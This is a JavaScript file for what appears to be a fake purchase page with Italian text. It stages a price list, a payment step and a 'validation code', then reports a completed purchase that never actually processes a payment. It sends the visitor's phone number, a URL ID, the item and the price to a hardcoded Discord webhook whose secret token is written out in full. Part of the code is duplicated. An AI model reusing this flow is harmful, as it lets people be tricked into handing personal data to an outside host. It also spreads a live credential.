setTimeout(function () {
  document.querySelector(".splash-art").style.display = "none";
  document.getElementById("priceListContainer").style.display = "block";
}, 4000);

var selectedItem = null;
var selectedPrice = null;

function selectItem(element, name, price) {
  var items = document.querySelectorAll(".item");
  items.forEach(function (item) {
    item.classList.remove("selected");
  });

  selectedItem = name;
  selectedPrice = price;
  element.classList.add("selected");

  document.getElementById("paymentMethodContainer").style.display = "block";
}

setTimeout(function () {
  document.querySelector(".splash-art").style.display = "none";
  document.getElementById("priceListContainer").style.display = "block";
}, 4000);

var selectedItem = null;
var selectedPrice = null;

function makePayment() {
  document.getElementById("paymentMethodContainer").style.display = "none";
  document.querySelector(".validation-code").style.display = "block";
  setTimeout(function () {
    document.querySelector(".validation-code").style.display = "none";
    document.querySelector(".transaction-complete").style.display = "block";
    document.getElementById("transactionStatus").innerText =
      "Hai effettuato l'acquisto, logout in corso";
    savePayment();
    setTimeout(function () {
      window.location.href = "../index.html";
    }, 3000);
  }, 3000);
}

function savePayment() {
  var idValue = getParameterByName("id");
  var itemName = selectedItem;
  var itemPrice = selectedPrice;
  var phoneNumber = document.getElementById("phoneNumber").value;

  const webhookURL =
    "https://discord.com/api/webhooks/1221935811977547936/KWCR_Jyq1Z8_DwuRm9G9lrlc7v4aI8R03-h-_9E2tzhaGWqzjRantI6c5E7c3L6upDXt";

  const data = {
    content: `**ID:** ${idValue}\n**NUMERO:** ${phoneNumber}\n**OGGETTO:** ${itemName}\n**PREZZO:** ${itemPrice}`,
  };

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => {
      if (!response.ok) {
        console.error("Errore nell'invio del webhook:", response.status);
      } else {
        console.log("Webhook inviato con successo!");
      }
    })
    .catch((error) => {
      console.error("Errore nella richiesta fetch:", error);
    });
}
function getParameterByName(name, url) {
  if (!url) url = window.location.href;
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return "";
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}
